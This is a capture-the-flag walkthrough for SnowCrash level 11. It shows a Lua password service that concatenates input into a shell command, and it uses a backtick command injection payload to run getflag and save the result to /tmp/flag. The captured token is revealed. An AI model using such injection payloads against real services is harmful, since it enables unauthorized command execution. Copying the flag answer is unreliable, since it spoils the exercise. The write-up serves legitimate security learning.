# Level11 Walkthrough

## Overview

This level exploits a command injection vulnerability in a Lua script. The script unsafely concatenates user input into a shell command, allowing arbitrary command execution.

## Walkthrough

### 1. Identify the vulnerable service

```bash
level11@SnowCrash:~$ ls -la
level11.lua

level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
  data = string.sub(data, 1, 40)
  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)
      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end
  end
  client:close()
end
```

### 2. Connect to the servic 
```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password:
```

###3. Exploit with command injection
The vulnerability is in line:
```bash
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

User input is directly concatenated into a shell command. Use backticks or $() to inject commands:

```bash
Password: `getflag` > /tmp/flag
```

###4. Read the captured flag

```bash
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

